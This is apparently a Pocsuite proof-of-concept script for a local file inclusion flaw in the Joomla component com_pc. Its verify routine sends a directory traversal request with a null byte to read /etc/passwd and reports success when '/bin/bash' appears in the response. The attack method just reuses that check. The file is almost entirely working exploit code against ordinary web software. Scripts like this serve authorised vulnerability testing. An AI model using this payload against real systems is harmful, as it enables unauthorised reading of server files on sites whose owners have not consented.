#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = '67513'
    version = '1'
    author = 'p9k4r'
    vulDate = '2010-1-17'
    createDate = '2015-9-28'
    updateDate = '2015-9-28'
    references = ['http://www.sebug.net/vuldb/ssvid-67513']
    name = 'Joomla Component com_pc LFI Vulnerability'
    appPowerLink = 'joomla.org'
    appName = 'Joomla Component com_pc'
    appVersion = '*'
    vulType = 'Local File Inclusion'
    desc = 'LFI'
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/index.php?option=com_pc&controller=../../../../../../../etc/passwd' % self.url
        response = req.get(vul_url + '%00', timeout=10).content

        if '/bin/bash' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output


register(TestPOC)
